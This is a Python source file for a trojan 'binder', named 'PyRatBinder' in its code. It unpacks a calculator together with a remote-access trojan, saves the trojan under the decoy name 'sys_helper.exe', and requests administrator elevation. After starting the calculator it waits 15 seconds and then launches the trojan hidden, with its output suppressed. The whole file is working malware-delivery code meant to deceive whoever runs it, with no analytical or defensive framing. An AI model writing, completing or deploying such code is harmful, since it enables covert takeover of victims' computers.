import sys
import os
import tempfile
import subprocess
import ctypes
import win32api
import win32event
import winerror
import time


def check_mutex():
    """Ensure single instance using mutex"""
    mutex_name = "Global\\PyRatBinder"
    mutex = None
    try:
        mutex = win32event.CreateMutex(None, True, mutex_name)
        if win32api.GetLastError() in (winerror.ERROR_ALREADY_EXISTS, 183):
            ctypes.windll.user32.MessageBoxW(0, "Calculator is already running", "System Alert", 0x40)
            sys.exit(1)
    except Exception as e:
        ctypes.windll.user32.MessageBoxW(0, f"Startup Error: {str(e)}", "Critical Error", 0x10)
        sys.exit(1)
    finally:
        if mutex:
            win32api.CloseHandle(mutex)


def main():
    """Main execution with secure file handling"""
    try:
        # Use custom temp directory
        temp_dir = os.path.join(tempfile.gettempdir(), "CalculatorCache")
        os.makedirs(temp_dir, exist_ok=True)

        # Set file paths
        calc_path = os.path.join(temp_dir, "win_calc.exe")
        rat_path = os.path.join(temp_dir, "sys_helper.exe")

        # Extract files with explicit permissions
        with open(os.path.join(sys._MEIPASS, 'calc.exe'), 'rb') as src, open(calc_path, 'wb') as dest:
            dest.write(src.read())
        os.chmod(calc_path, 0o777)

        with open(os.path.join(sys._MEIPASS, 'rat_server.exe'), 'rb') as src, open(rat_path, 'wb') as dest:
            dest.write(src.read())
        os.chmod(rat_path, 0o777)

        # Prepare environment
        env = os.environ.copy()
        if hasattr(sys, '_MEIPASS'):  # Add DLL directory to PATH
            env['PATH'] = f"{sys._MEIPASS};{env['PATH']}"

        # Start Calculator
        subprocess.Popen([calc_path],
                         creationflags=subprocess.CREATE_NO_WINDOW,
                         env=env)

        # Delayed RAT execution
        time.sleep(15)
        subprocess.Popen([rat_path],
                         creationflags=subprocess.SW_HIDE | subprocess.CREATE_NO_WINDOW,
                         stdin=subprocess.DEVNULL,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         env=env)
        sys.exit(0)

    except Exception as e:
        ctypes.windll.user32.MessageBoxW(0, f"Error: {str(e)}", "Failure", 0x10)
        sys.exit(1)


def elevate():
    """Admin elevation with proper argument passing"""
    if sys.platform != 'win32':  # Restore platform check
        return

    if ctypes.windll.shell32.IsUserAnAdmin():
        return

    args = [sys.argv[0]]
    if hasattr(sys, '_MEIPASS'):
        args.extend(['--dll-dir', sys._MEIPASS])

    ctypes.windll.shell32.ShellExecuteW(
        None,
        "runas",
        sys.executable,
        ' '.join(f'"{arg}"' for arg in args),
        None,
        1
    )
    sys.exit(0)


if __name__ == "__main__":
    check_mutex()
    if '--dll-dir' in sys.argv:  # Restore PATH handling
        dll_dir = sys.argv[sys.argv.index('--dll-dir') + 1]
        os.environ['PATH'] = f"{dll_dir};{os.environ['PATH']}"
    elevate()
    main()